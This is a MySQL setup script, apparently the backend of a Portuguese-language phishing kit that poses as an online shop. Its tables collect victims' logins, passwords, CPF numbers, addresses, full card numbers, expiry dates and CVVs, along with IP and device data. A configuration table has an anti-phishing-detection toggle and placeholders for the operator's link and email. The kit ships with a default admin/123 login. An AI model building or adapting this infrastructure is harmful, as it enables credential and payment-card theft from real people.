
CREATE TABLE `capturas` (
  `id` int(11) NOT NULL,
  `usuario` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cep` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `endereco` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `complemento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bairro` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cidade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `estado` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ponto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `apelido` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cpf` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `titular_cartao` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cc` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `validade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cvv` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dia` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dispositivo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `consulta` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;

CREATE TABLE `capturas_boleto` (
  `id` int(11) NOT NULL,
  `usuario` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cep` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `endereco` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `numero` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `complemento` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `bairro` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `cidade` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `estado` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ponto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `apelido` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dia` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `ip` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `dispositivo` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `id_produto` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;


CREATE TABLE `configuracao` (
  `id` int(11) NOT NULL,
  `link_site` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `email` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `anti_phising` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `alterna` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `vencimento` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `limite_engenharia` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `exibi_preco` varchar(2) COLLATE utf8_unicode_ci NOT NULL,
  `desconto` varchar(2) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;


INSERT INTO `configuracao` (`id`, `link_site`, `email`, `anti_phising`, `alterna`, `vencimento`, `limite_engenharia`, `exibi_preco` , `desconto`) VALUES
(1, 'http://SEULINK/', 'SEU EMAIL', '1', '1', '2', 'limit 0,5', '1', '5');


CREATE TABLE `boletos` (
  `id` int(11) NOT NULL,
  `numero` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `id_produto` varchar(150) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;


CREATE TABLE `contador_2` (
  `id` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `visitas` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;


INSERT INTO `contador_2` (`id`, `visitas`) VALUES
('1', '0');





CREATE TABLE `produtos` (
  `id` int(11) NOT NULL,
  `url` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `preco` varchar(150) COLLATE utf8_unicode_ci NOT NULL,
  `nome_produto` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `img` varchar(300) COLLATE utf8_unicode_ci NOT NULL,
  `status_boleto` varchar(300) COLLATE utf8_unicode_ci NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;


CREATE TABLE `usuarios` (
  `login` varchar(15) COLLATE utf8_unicode_ci NOT NULL,
  `senha` varchar(20) COLLATE utf8_unicode_ci DEFAULT NULL
) ENGINE=MyISAM DEFAULT CHARSET=utf8 COLLATE=utf8_unicode_ci;



INSERT INTO `usuarios` (`login`, `senha`) VALUES
('admin', '123');




ALTER TABLE `capturas`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `configuracao`
  ADD PRIMARY KEY (`id`);

ALTER TABLE `contador_2`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `produtos`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `usuarios`
  ADD PRIMARY KEY (`login`);


ALTER TABLE `boletos`
  ADD PRIMARY KEY (`id`);

  ALTER TABLE `capturas_boleto`
  ADD PRIMARY KEY (`id`);


ALTER TABLE `capturas`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT;


ALTER TABLE `configuracao`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;
  
  ALTER TABLE `capturas_boleto`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;
  
ALTER TABLE `boletos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;


ALTER TABLE `produtos`
  MODIFY `id` int(11) NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=1;
COMMIT;

